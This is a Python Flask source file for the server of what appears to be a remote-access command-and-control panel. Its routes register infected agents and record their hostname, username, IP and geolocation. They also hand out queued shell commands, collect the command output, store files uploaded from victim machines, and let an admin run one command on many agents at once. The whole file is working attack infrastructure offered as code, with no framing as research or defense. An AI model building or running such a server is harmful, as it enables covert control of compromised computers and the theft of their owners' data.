import json
import base64
import os
from datetime import datetime
import tempfile
import shutil

from flask import Blueprint
from flask import request
from flask import abort
from flask import current_app
from flask import url_for
from flask import send_file
from flask import render_template
from werkzeug.utils import secure_filename
import pygeoip
from flask import flash
from flask import redirect
from flask import escape
import cgi

from webui import require_admin
from models import db
from models import Agent
from models import Command


api = Blueprint('api', __name__)
GEOIP = pygeoip.GeoIP('api/GeoIP.dat', pygeoip.MEMORY_CACHE)


def geolocation(ip):
    geoloc_str = 'Local'
    info = GEOIP.record_by_addr(ip)
    if info:
        geoloc_str = info['city'] + ' [' + info['country_code'] + ']'
    return geoloc_str


@api.route('/massexec', methods=['POST'])
@require_admin
def mass_execute():
    selection = request.form.getlist('selection')
    if 'execute' in request.form:
        for agent_id in selection:
            Agent.query.get(agent_id).push_command(request.form['cmd'])
        flash('Executed "%s" on %s agents' % (request.form['cmd'], len(selection)))
    elif 'delete' in request.form:
        for agent_id in selection:
            db.session.delete(Agent.query.get(agent_id))
        db.session.commit()
        flash('Deleted %s agents' % len(selection))
    return redirect(url_for('webui.agent_list'))


@api.route('/<agent_id>/push', methods=['POST'])
@require_admin
def push_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    agent.push_command(request.form['cmdline'])
    return ''


@api.route('/<agent_id>/stdout')
@require_admin
def agent_console(agent_id):
    agent = Agent.query.get(agent_id)
    return render_template('agent_console.html', agent=agent)


@api.route('/<agent_id>/hello', methods=['POST'])
def get_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        agent = Agent(agent_id)
        db.session.add(agent)
        db.session.commit()
    # Report basic info about the agent
    info = request.json
    if info:
        if 'platform' in info:
            agent.operating_system = info['platform']
        if 'hostname' in info:
            agent.hostname = info['hostname']
        if 'username' in info:
            agent.username = info['username']
    agent.last_online = datetime.now()
    agent.remote_ip = request.remote_addr
    agent.geolocation = geolocation(agent.remote_ip)
    db.session.commit()
    # Return pending commands for the agent
    cmd_to_run = ''
    cmd = agent.commands.order_by(Command.timestamp.desc()).first()
    if cmd:
        cmd_to_run = cmd.cmdline
        db.session.delete(cmd)
        db.session.commit()
    return cmd_to_run


@api.route('/<agent_id>/report', methods=['POST'])
def report_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    out = request.form['output']
    agent.output += cgi.escape(out)
    db.session.add(agent)
    db.session.commit()
    return ''


@api.route('/<agent_id>/upload', methods=['POST'])
def upload(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    for file in request.files.values():
        upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
        agent_dir = agent_id
        store_dir = os.path.join(upload_dir, agent_dir)
        filename = secure_filename(file.filename)
        if not os.path.exists(store_dir):
            os.makedirs(store_dir)
        file_path = os.path.join(store_dir, filename)
        while os.path.exists(file_path):
            filename = "_" + filename
            file_path = os.path.join(store_dir, filename)
        file.save(file_path)
        download_link = url_for('webui.uploads', path=agent_dir + '/' + filename)
        agent.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
        db.session.add(agent)
        db.session.commit()
    return ''
